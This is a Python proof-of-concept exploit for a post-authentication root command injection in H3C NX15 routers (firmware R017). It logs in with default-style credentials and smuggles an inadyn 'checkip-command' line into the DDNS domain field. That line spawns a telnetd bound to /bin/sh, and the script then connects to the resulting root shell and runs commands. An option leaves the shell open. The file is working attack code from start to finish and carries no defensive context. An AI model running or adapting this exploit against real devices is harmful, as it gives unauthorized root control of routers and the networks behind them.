#!/usr/bin/env python3
import argparse
import json
import socket
import sys
import time
from typing import Any

import requests


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'login failed: {j}')
    return j['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict[str, Any], timeout: int = 20):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def result_of(resp: Any) -> dict[str, Any]:
    if isinstance(resp, list) and resp and isinstance(resp[0], dict):
        return resp[0].get('result', {})
    if isinstance(resp, dict):
        return resp.get('result', {})
    return {}


def get_noip(base: str, session: str) -> dict[str, Any]:
    resp = esps(base, session, 'esps.ddns', 'get', {'serviceName': 'noip'})
    result = result_of(resp)
    if result.get('code') != 0:
        raise RuntimeError(f'get noip failed: {resp}')
    return result['data']


def set_noip(base: str, session: str, status: str, user: str, password: str, domain: str, intf: str = 'WAN1'):
    param = {
        'serviceName': 'noip',
        'status': status,
        'user': user,
        'password': password,
        'domain': domain,
        'intf': intf,
    }
    resp = esps(base, session, 'esps.ddns', 'set', param, timeout=30)
    result = result_of(resp)
    if result.get('code') != 0:
        raise RuntimeError(f'set noip failed: {resp}')
    return resp


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    sock.sendall(f'{cmd}; echo {end_marker}\n'.encode())
    time.sleep(0.7)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def payload_for_port(port: int) -> str:
    payload = f'a\ncheckip-command = "telnetd -p{port} -l/bin/sh"'
    if len(payload) > 63:
        raise ValueError(f'payload too long for ddns domain field ({len(payload)} > 63)')
    return payload


def wait_for_port(host: str, port: int, timeout: float = 8.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=1.0)
            s.close()
            return True
        except Exception:
            time.sleep(0.3)
    return False


def main() -> int:
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth root RCE via esps.ddns -> swddns -> inadyn checkip-command injection')
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='target host')
    ap.add_argument('--port', type=int, default=2499, help='spawned telnetd port')
    ap.add_argument('--keep-shell', action='store_true', help='do not kill spawned telnetd or restore original DDNS config')
    args = ap.parse_args()

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log('[*] Step 2: backup current DDNS noip config')
    original = get_noip(args.base, session)
    print(json.dumps(original, ensure_ascii=False, indent=2))

    payload = payload_for_port(args.port)
    log(f'[*] Step 3: write malicious DDNS domain payload ({len(payload)} bytes)')
    print(payload)
    set_noip(args.base, session, 'enable', 'u', 'p', payload, original.get('intf', 'WAN1'))

    log(f'[*] Step 4: wait for root telnet shell on {args.host}:{args.port}')
    if not wait_for_port(args.host, args.port, timeout=8.0):
        raise RuntimeError('spawned telnetd port did not open')

    log('[*] Step 5: connect spawned root shell and extract proof')
    sock, banner = connect_shell(args.host, args.port)
    print(banner.decode('latin1', 'ignore'))
    proof = run_shell_cmd(sock, 'id; uname -a')
    print(proof)
    ok = 'uid=0(root)' in proof

    if args.keep_shell:
        sock.close()
        if ok:
            log('[+] SUCCESS: root shell left running per --keep-shell')
            return 0
        log('[-] FAILED: expected root proof was not observed')
        return 1

    log('[*] Step 6: cleanup spawned telnetd from obtained root shell')
    cleanup_out = run_shell_cmd(
        sock,
        f'pid=$(ps | grep telnetd | grep p{args.port} | grep l/bin/sh | grep -v grep | awk "{{print $1}}"); '
        f'[ -n "$pid" ] && kill $pid; sleep 1; ps | grep telnetd | grep p{args.port} | grep -v grep'
    )
    print(cleanup_out)
    sock.close()

    log('[*] Step 7: restore original DDNS noip config')
    set_noip(
        args.base,
        session,
        original.get('status', 'disable'),
        original.get('user', ''),
        original.get('password', ''),
        original.get('domain', ''),
        original.get('intf', 'WAN1'),
    )

    if ok:
        log('[+] SUCCESS: obtained root code execution via esps.ddns checkip-command injection')
        return 0

    log('[-] FAILED: expected root proof was not observed')
    return 1


if __name__ == '__main__':
    sys.exit(main())
